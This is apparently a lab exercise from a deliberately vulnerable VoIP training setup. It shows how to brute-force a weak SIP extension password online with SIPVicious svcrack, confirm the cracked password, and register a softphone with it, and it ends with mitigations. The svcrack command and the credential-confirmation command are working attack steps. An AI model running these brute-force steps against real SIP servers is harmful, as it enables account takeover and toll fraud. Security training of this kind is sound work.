# Exercise 3: Online SIP Credential Cracking with svcrack

## Goal

Use SIPVicious OSS `svcrack` to brute-force the weak SIP password for extension `1000` by sending live authentication attempts to the `pbx2` edge, then verify the recovered credential.

## Prerequisites

- DVRTC running: `./scripts/compose.sh --scenario pbx2 up -d`
- SIPVicious OSS and `dvrtc-checks` available in the `attacker` service

## Steps

### Step 1: Open an interactive attacker shell

Run on the host:

```bash
./scripts/compose.sh --scenario pbx2 run --rm attacker sh
```

`PUBLIC_IPV4` is already set in this shell.

### Step 2: Run svcrack against extension 1000

In the attacker shell:

```bash
sipvicious_svcrack -u 1000 -e 1000 -r 1000-2000 udp://$PUBLIC_IPV4:5060
```

### Step 3: Observe the recovered credential

The expected result in the default `pbx2` configuration is:

```text
+-----------+----------+
| Extension | Password |
+===========+==========+
| 1000      | 1500     |
+-----------+----------+
```

`sipvicious_svcrack` exits non-zero after a successful crack, so trust the printed table here.

### Step 4: Confirm the recovered credential with dvrtc-checks

In the attacker shell:

```bash
dvrtc-checks weak-cred --host $PUBLIC_IPV4 --username 1000 --password 1500
exit
```

Look for `Weak credential vulnerability confirmed` and `SIP response codes observed: [200]`.

### Step 5: Verify the password with a software SIP phone

Run on the host. Use a softphone such as `Zoiper` or `Linphone` and configure it with:

- Username: `1000`
- Password: `1500`
- Domain / SIP server: the Docker host IP, or `127.0.0.1` only if the softphone is running on the same host as DVRTC
- Transport: `UDP`

If the phone registers successfully, the recovered password is correct. You can also place a test call to extension `1200` to reach the echo service and confirm the account works end to end.

## What's happening

`svcrack` performs online password cracking by sending SIP requests that trigger digest authentication and then retrying with candidate passwords until one works. In `pbx2`, FreeSWITCH holds the credentials for extension `1000` and OpenSIPS forwards the authentication exchange between the attacker and the PBX, so every guess reaches FreeSWITCH in real time. Because extension `1000` is intentionally configured with a weak password, a small numeric range is enough to recover it quickly.

This is different from offline cracking. Every guess in this exercise is sent to the target service in real time, so the attack depends on the server continuing to answer authentication attempts and not enforcing strong rate limits or lockouts.

## Mitigation

- Use strong, non-predictable SIP passwords
- Rate-limit and alert on repeated SIP authentication attempts
- Lock or delay repeated failures for the same account
- Restrict SIP access to trusted networks, VPNs, or an SBC
